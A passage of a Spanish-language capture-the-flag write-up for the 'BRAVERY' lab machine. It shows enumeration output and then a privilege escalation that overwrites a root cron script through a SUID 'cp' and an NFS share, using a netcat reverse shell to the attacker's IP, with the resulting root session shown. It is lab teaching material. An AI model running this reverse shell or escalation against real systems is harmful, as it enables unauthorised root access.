 access_compat_module (shared)
 actions_module (shared)
 alias_module (shared)
 allowmethods_module (shared)
 auth_basic_module (shared)
 auth_digest_module (shared)
 authn_anon_module (shared)
 authn_core_module (shared)
 authn_dbd_module (shared)
 authn_dbm_module (shared)
 authn_file_module (shared)
 authn_socache_module (shared)
 authz_core_module (shared)
 authz_dbd_module (shared)
 authz_dbm_module (shared)
 authz_groupfile_module (shared)
 authz_host_module (shared)
 authz_owner_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 cache_module (shared)
 cache_disk_module (shared)
 data_module (shared)
 dbd_module (shared)
 deflate_module (shared)
 dir_module (shared)
 dumpio_module (shared)
 echo_module (shared)
 env_module (shared)
 expires_module (shared)
 ext_filter_module (shared)
 filter_module (shared)
 headers_module (shared)
 include_module (shared)
 info_module (shared)
 log_config_module (shared)
 logio_module (shared)
 mime_magic_module (shared)
 mime_module (shared)
 negotiation_module (shared)
 remoteip_module (shared)
 reqtimeout_module (shared)
 rewrite_module (shared)
 setenvif_module (shared)
 slotmem_plain_module (shared)
 slotmem_shm_module (shared)
 socache_dbm_module (shared)
 socache_memcache_module (shared)
 socache_shmcb_module (shared)
 status_module (shared)
 substitute_module (shared)
 suexec_module (shared)
 unique_id_module (shared)
 unixd_module (shared)
 userdir_module (shared)
 version_module (shared)
 vhost_alias_module (shared)
 dav_module (shared)
 dav_fs_module (shared)
 dav_lock_module (shared)
 lua_module (shared)
 mpm_prefork_module (shared)
 proxy_module (shared)
 lbmethod_bybusyness_module (shared)
 lbmethod_byrequests_module (shared)
 lbmethod_bytraffic_module (shared)
 lbmethod_heartbeat_module (shared)
 proxy_ajp_module (shared)
 proxy_balancer_module (shared)
 proxy_connect_module (shared)
 proxy_express_module (shared)
 proxy_fcgi_module (shared)
 proxy_fdpass_module (shared)
 proxy_ftp_module (shared)
 proxy_http_module (shared)
 proxy_scgi_module (shared)
 proxy_wstunnel_module (shared)
 ssl_module (shared)
 systemd_module (shared)
 cgi_module (shared)
 php5_module (shared)


### INTERESTING FILES ####################################
[-] Useful file locations:
/usr/bin/nc
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r--. 1 root root 2586 Jul 10  2018 /etc/passwd
-rw-r--r--. 1 root root 1046 Jul 10  2018 /etc/group
-rw-r--r--. 1 root root 1819 Apr 11  2018 /etc/profile
----------. 1 root root 1516 Jul 10  2018 /etc/shadow


[-] SUID files:
-rwsrwxrwx. 1 root root 46631 Mar 25 05:55 /var/nfsshare/LinEnum.sh
-rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp
-rws--x--x. 1 root root 24048 Apr 11  2018 /usr/bin/chfn
-rws--x--x. 1 root root 23960 Apr 11  2018 /usr/bin/chsh
-rwsr-xr-x. 1 root root 32008 Apr 11  2018 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 64240 Nov  5  2016 /usr/bin/chage
-rwsr-xr-x. 1 root root 78216 Nov  5  2016 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 41776 Nov  5  2016 /usr/bin/newgrp
---s--x--x. 1 root root 143184 Apr 11  2018 /usr/bin/sudo
-rwsr-xr-x. 1 root root 44320 Apr 11  2018 /usr/bin/mount
-rwsr-xr-x. 1 root root 32184 Apr 11  2018 /usr/bin/su
-rwsr-xr-x. 1 root root 32048 Apr 11  2018 /usr/bin/umount
-rwsr-xr-x. 1 root root 2409344 Apr 11  2018 /usr/bin/Xorg
-rwsr-xr-x. 1 root root 27680 Apr 10  2018 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 57576 Apr 10  2018 /usr/bin/crontab
-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /usr/bin/passwd
-rwsr-xr-x. 1 root root 61416 May  9  2018 /usr/bin/ksu
-rwsr-xr-x. 1 root root 52952 Apr 10  2018 /usr/bin/at
---s--x---. 1 root stapusr 203832 Apr 12  2018 /usr/bin/staprun
-rwsr-xr-x. 1 root root 11216 Apr 10  2018 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 36280 Apr 10  2018 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11288 Apr 11  2018 /usr/sbin/usernetctl
-rws--x--x. 1 root root 40312 Jun  9  2014 /usr/sbin/userhelper
-rwsr-xr-x. 1 root root 113408 Apr 12  2018 /usr/sbin/mount.nfs
-rwsr-xr-x. 1 root root 15432 Apr 10  2018 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root dbus 58016 Apr 11  2018 /usr/libexec/dbus-1/dbus-daemon-launch-helper
-rwsr-xr-x. 1 root root 49600 Apr 11  2018 /usr/libexec/flatpak-bwrap
-rwsr-x---. 1 root sssd 153736 Apr 12  2018 /usr/libexec/sssd/krb5_child
-rwsr-x---. 1 root sssd 78408 Apr 12  2018 /usr/libexec/sssd/ldap_child
-rwsr-x---. 1 root sssd 49632 Apr 12  2018 /usr/libexec/sssd/selinux_child
-rwsr-x---. 1 root sssd 27872 Apr 12  2018 /usr/libexec/sssd/proxy_child
-rwsr-xr-x. 1 root root 15440 May 21  2018 /usr/libexec/qemu-bridge-helper
-rwsr-xr-x. 1 root root 15512 Apr 12  2018 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
-rwsr-sr-x. 1 abrt abrt 15432 Apr 27  2018 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache


[+] Possibly interesting SUID files:
-rwsrwxrwx. 1 root root 46631 Mar 25 05:55 /var/nfsshare/LinEnum.sh
-rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp


[+] World-writable SUID files:
-rwsrwxrwx. 1 root root 46631 Mar 25 05:55 /var/nfsshare/LinEnum.sh


[+] World-writable SUID files owned by root:
-rwsrwxrwx. 1 root root 46631 Mar 25 05:55 /var/nfsshare/LinEnum.sh


[-] SGID files:
-r-xr-sr-x. 1 root tty 15344 Jun  9  2014 /usr/bin/wall
-rwxr-sr-x. 1 root tty 19624 Apr 11  2018 /usr/bin/write
---x--s--x. 1 root nobody 382240 Apr 11  2018 /usr/bin/ssh-agent
-rwx--s--x. 1 root slocate 40520 Apr 10  2018 /usr/bin/locate
-rwxr-sr-x. 1 root cgred 15624 Apr 10  2018 /usr/bin/cgclassify
-rwxr-sr-x. 1 root cgred 15592 Apr 10  2018 /usr/bin/cgexec
-rwxr-sr-x. 1 root root 11224 Apr 11  2018 /usr/sbin/netreport
-rwxr-sr-x. 1 root postdrop 218552 Jun  9  2014 /usr/sbin/postdrop
-rwxr-sr-x. 1 root postdrop 259992 Jun  9  2014 /usr/sbin/postqueue
-rwx--s--x. 1 root lock 11208 Jun  9  2014 /usr/sbin/lockdev
-rwx--s--x. 1 root utmp 15560 Sep  4  2017 /usr/lib64/vte-2.91/gnome-pty-helper
-rwx--s--x. 1 root utmp 11192 Jun  9  2014 /usr/libexec/utempter/utempter
---x--s--x. 1 root ssh_keys 469880 Apr 11  2018 /usr/libexec/openssh/ssh-keysign
-rwsr-sr-x. 1 abrt abrt 15432 Apr 27  2018 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache


[+] Files with POSIX capabilities set:
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/mtr = cap_net_raw+ep


[-] NFS config details: 
-rw-r--r--. 1 root root 41 Dec 26  2018 /etc/exports
/var/nfsshare  *(rw,sync,no_root_squash)


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r--. 1 root root 61 Mar 23 11:45 /etc/resolv.conf
-rw-r-----. 1 root root 191 Oct 12  2017 /etc/libaudit.conf
-rw-r--r--. 1 root root 1285 Apr 11  2018 /etc/dracut.conf
-rw-r--r--. 1 root root 9 Jun  7  2013 /etc/host.conf
-rw-r--r--. 1 root root 28 Feb 27  2013 /etc/ld.so.conf
-rw-r--r--. 1 root root 1746 Jun 10  2018 /etc/nsswitch.conf
-rw-r--r--. 1 root root 216 Apr 11  2018 /etc/sestatus.conf
-rw-r--r--. 1 root root 590 Apr 10  2018 /etc/krb5.conf
-rw-r--r--. 1 root root 449 Apr 11  2018 /etc/sysctl.conf
-rw-r--r--. 1 root root 38 Apr 10  2018 /etc/fuse.conf
-rw-r--r--. 1 root root 842 Nov  5  2016 /etc/GeoIP.conf
-rw-r--r--. 1 root root 662 Jul 31  2013 /etc/logrotate.conf
-rw-r--r--. 1 root root 55 Apr 10  2018 /etc/asound.conf
-rw-r--r--. 1 root root 2391 Oct 12  2013 /etc/libuser.conf
-rw-r--r--. 1 root root 967 Dec 25  2018 /etc/nfs.conf
-rw-r--r--. 1 root root 3390 Apr 12  2018 /etc/nfsmount.conf
-rw-r--r--. 1 root root 970 Apr 13  2018 /etc/yum.conf
-rw-r--r--. 1 root root 5171 Jun  9  2014 /etc/man_db.conf
-rw-r--r--. 1 root root 3232 May 14  2018 /etc/rsyslog.conf
-rw-r--r--. 1 root root 7265 Jun 10  2018 /etc/kdump.conf
-rw-r--r--. 1 root root 433 May 16  2018 /etc/radvd.conf
-rw-r--r--. 1 root root 1108 Apr 12  2018 /etc/chrony.conf
-rw-r--r--. 1 root root 112 May 14  2018 /etc/e2fsck.conf
-rw-r--r--. 1 root root 936 May 16  2018 /etc/mke2fs.conf
-rw-r-----. 1 root root 3181 Apr 10  2018 /etc/sudo-ldap.conf
-rw-r-----. 1 root root 1786 Apr 10  2018 /etc/sudo.conf
-rw-r--r--. 1 root root 0 Jun  9  2014 /etc/wvdial.conf
-rw-r--r--. 1 root root 37 Jun 10  2018 /etc/vconsole.conf
-rw-r--r--. 1 root root 19 Jun 10  2018 /etc/locale.conf
-rw-r--r--. 1 root root 4922 Mar  5  2015 /etc/oddjobd.conf
-rw-------. 1 tss tss 7046 Aug  3  2017 /etc/tcsd.conf
-rw-r--r--. 1 root root 1362 Jun  9  2014 /etc/pbm2ppa.conf
-rw-r--r--. 1 root root 458 Apr 10  2018 /etc/rsyncd.conf
-rw-r--r--. 1 root root 557 Apr 10  2018 /etc/updatedb.conf
-rw-r--r--. 1 root root 14622 Apr 12  2018 /etc/autofs.conf
-rw-r--r--. 1 root root 1787 Jun  9  2014 /etc/request-key.conf
-rw-r--r--. 1 root root 6300 Jun  9  2014 /etc/pnm2ppa.conf
-rw-r--r--. 1 root root 4849 Apr 11  2018 /etc/idmapd.conf
-rw-r--r--. 1 root root 21929 Apr 10  2018 /etc/brltty.conf
-rw-r--r--. 1 root root 100 May 16  2018 /etc/sos.conf
-rw-r--r--. 1 root root 26832 Apr 10  2018 /etc/dnsmasq.conf
-rw-r--r--. 1 root root 478 May 21  2018 /etc/ksmtuned.conf
-rw-------. 1 root root 232 Apr 12  2018 /etc/autofs_ldap_auth.conf
-rw-r--r--. 1 root root 676 Apr 10  2018 /etc/cgconfig.conf
-rw-r--r--. 1 root root 265 Jun 13  2018 /etc/cgrules.conf
-rw-r--r--. 1 root root 131 Apr 10  2018 /etc/cgsnapshot_blacklist.conf
-rw-r--r--. 1 root root 1623 Apr 12  2018 /etc/ipsec.conf
-rw-r--r--. 1 root root 1523 Apr 10  2018 /etc/usb_modeswitch.conf
-rw-r--r--. 1 root root 91 Dec  3  2012 /etc/numad.conf
-rw-r--r--. 1 root root 1174 Apr 10  2018 /etc/dleyna-server-service.conf
-rw-------. 1 root root 87 Jun 23  2018 /etc/ossec-init.conf
-rw-r--r--. 1 root root 2000 Apr 10  2018 /etc/ntp.conf
-rw-r--r--. 1 root root 2620 Jun 10  2014 /etc/mtools.conf
-rw-r--r--. 1 root root 20 Jun 24  2014 /etc/fprintd.conf


[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r--. 1 root root 1735 Apr 10  2018 /etc/nsswitch.conf.bak
-rw-------. 1 root root 322 Jun 14  2018 /etc/sysconfig/network-scripts/ifcfg-ens33.bak
-rw-r--r--. 1 root root 710 Jun 14  2018 /etc/samba/smb.conf.bak


[-] Any interesting mail in /var/mail:
lrwxrwxrwx. 1 root root 10 Jun 10  2018 /var/mail -> spool/mail


### SCAN COMPLETE ####################################
```

Lo único importante de ese pedazo de resultado fueron dos cosas:
 - El comando `cp` tiene privilegios de [SUID](https://www.ibiblio.org/pub/linux/docs/LuCaS/Manuales-LuCAS/doc-unixsec/unixsec-html/node56.html)
 - Esta instalado `Netcat`!!

Después de pasar mucho pero mucho tiempo buscando resulta que en la carpeta `/var/www` existe un archivo llamado `maintenance.sh` y resulta también que es ejecutado por una tarea de `cron` cada 5 minutos con privilegios de root. Lo único que hace por el momento es crear el archivo `README.txt` y cambiarles los permisos para que el usuario **apache** pueda leerlo.

Así que combinando, `cp`, `nc` y el share de nfs lo único que tuve que hacer fue lo siguiente:

 - Crear un script llamado `maintenance.sh` en la máquina atacante que generara una conexión con `nc` a mi máquina atacante.

---
```bash
#! /bin/bash
nc 10.0.0.131 4444 -e /bin/bash
```
---

 - Copiar el script al nfs share, darle todos los permisos.
 - Dentro de la VM atacada utilizar el comando `cp`con **SUID** para sobreescribir el script `maintenance.sh` original con el mío.

---

Solo resta esperar unos minutos a que se haga la conexión.


---


### **Flag**
---
```console
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.0.137.
Ncat: Connection from 10.0.0.137:33894.
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
pwd
/root
ls
anaconda-ks.cfg
author-secret.txt
Desktop
Documents
Downloads
Music
ossec-hids-2.8
Pictures
proof.txt
Public
Templates
Videos
cat proof.txt
Congratulations on rooting BRAVERY. :)
```

---


### **Conclusión**

---

Ninguna

---